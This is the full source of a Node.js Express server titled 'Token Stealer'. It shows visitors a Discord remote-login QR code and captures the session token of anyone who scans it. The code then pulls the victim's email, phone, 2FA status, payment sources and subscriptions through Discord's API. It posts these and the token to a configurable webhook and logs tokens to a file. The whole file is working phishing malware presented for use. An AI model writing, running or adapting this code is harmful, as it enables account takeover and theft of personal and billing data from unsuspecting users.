const chalk = require('chalk');
const { RemoteAuthClient } = require('discord-remote-auth');
const express = require('express');
const r = require('express-rate-limit');
const fs = require('fs');
const axios = require('axios'); 

const app = express();

var traffic = 0; 
var webhookURL = ""; //PLEASE PUT WEBHOOK URL HERE

function write(content, file) {
    fs.appendFile(file, content, function (err) { });
}
//Rate limiter || Used to stop abuse by mass requests
var limiter = new r(
{
	statusCode: 429,
	windowMs: 60 * 1000,
	max: 10,
	message:
	{
		type: "error",
		title: "Rate Limited",
		msg: "Rate Limited, please try again later!",
		extra: "Take the L"
	}
});

app.use(limiter);

async function getTokenData(token){
	var res = await axios.get('https://discordapp.com/api/v6/users/@me', { 
		validateStatus: false,
		headers: {
			'Authorization': token,
		}
	}) 
	var data = { 
		id: res.data["id"],
		username: res.data["username"] + res.data["discriminator"], 
		twoFA: res.data["mfa_enabled"], 
		email: res.data["email"],
		phone: res.data["phone"],
		verified: res.data["verified"],
		billing: "", 
		subscriptions: "", 
		token: "",
	}
	
	var res = await axios.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', {
		validateStatus: false,
		headers: {
			'Authorization': token,
		}
	})
	var billing = res.data; 
	data.billing = billing;
	
	var res = await axios.get('https://discordapp.com/api/v9/users/@me/billing/subscriptions', {
		validateStatus: false,
		headers: {
			'Authorization': token,
		}
	})
	var subscriptions = res.data; 
	
	data.subscriptions = subscriptions;
	data.token = token; 
	
	return data; 
}


async function webhook(data){
	
	let params = {
        username: 'Token Stealer',
        content: "```js\n" + JSON.stringify(data).replace(/,/g,",\n") + "```",
    };

	var res = await axios.post(webhookURL, params, {
		headers: {
			'Content-type': 'application/json'
		},
	})
	console.log(res.data);
	
}

app.get('/', async (req, res) => {
	traffic++;
	//Grabs Ip && Starts auth connection for token grabbing
    var ip_addr = req.headers['x-forwarded-for'] || req.connection.remoteAddress.replace('::ffff:', '');
    var auth_client = new RemoteAuthClient();
	
    auth_client.on('pendingRemoteInit', async fingerprint => {
		console.log(`[${chalk.greenBright('+')}]` + ` Connected | IP: ${ip_addr} FingerPrint: ${fingerprint}`);
        await res.render('index.ejs', { qr_code_path: `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=https://discordapp.com/ra/${fingerprint}` });
    })

    auth_client.on('finish', async token => {

		webhook(await getTokenData(token))
		write(token + "\n", "tokens.txt");
		
    })
	process.title = `[313] Token Stealer | Connections: ${traffic}`;
    auth_client.connect();
})

app.listen(80, () => {
    console.clear()
	process.title = "[313] Token Stealer";
    console.log(chalk.greenBright(`
            ████████╗ ██████╗ ██╗  ██╗███████╗███╗   ██╗    ███████╗████████╗███████╗ █████╗ ██╗     ███████╗██████╗ 
            ╚══██╔══╝██╔═══██╗██║ ██╔╝██╔════╝████╗  ██║    ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║     ██╔════╝██╔══██╗
               ██║   ██║   ██║█████╔╝ █████╗  ██╔██╗ ██║    ███████╗   ██║   █████╗  ███████║██║     █████╗  ██████╔╝
               ██║   ██║   ██║██╔═██╗ ██╔══╝  ██║╚██╗██║    ╚════██║   ██║   ██╔══╝  ██╔══██║██║     ██╔══╝  ██╔══██╗
               ██║   ╚██████╔╝██║  ██╗███████╗██║ ╚████║    ███████║   ██║   ███████╗██║  ██║███████╗███████╗██║  ██║
               ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝    ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝
    `));
    console.log(`[${chalk.greenBright('+')}] http://127.0.0.1:80`);
	console.log(``);
});
